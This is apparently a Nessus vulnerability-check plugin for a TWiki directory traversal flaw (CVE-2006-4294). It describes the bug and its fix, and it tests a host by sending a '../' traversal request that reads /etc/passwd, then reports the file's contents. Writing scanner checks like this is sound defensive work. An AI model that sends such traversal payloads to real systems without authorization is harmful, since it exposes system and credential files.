#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(22362);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2006-4294");
  script_bugtraq_id(19907);
  script_xref(name:"OSVDB", value:"28603");

  script_name(english:"TWiki filename Parameter Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a local file with TWiki");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Perl script that is prone to a
directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The version of TWiki on the remote host allows directory traversal
sequences in the 'filename' parameter in the 'viewfile' function of
'lib/TWiki/UI/View.pm'.  An unauthenticated attacker can leverage this
flaw to view arbitrary files on the remote host subject to the
privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2006-4294" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/mailarchive/forum.php?thread_id=30468855&forum_id=3703" );
 script_set_attribute(attribute:"solution", value:
"Apply Hotfix 3 for TWiki-4.0.4." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("twiki_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);


# Test an install.
install = get_kb_item(string("www/", port, "/twiki"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../etc/passwd";
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/viewfile/TWiki/TWikiDocGraphics?",
      "filename=", file));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    if (report_verbosity)
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = NULL;

    security_warning(port:port, extra:report);
    exit(0);
  }
}

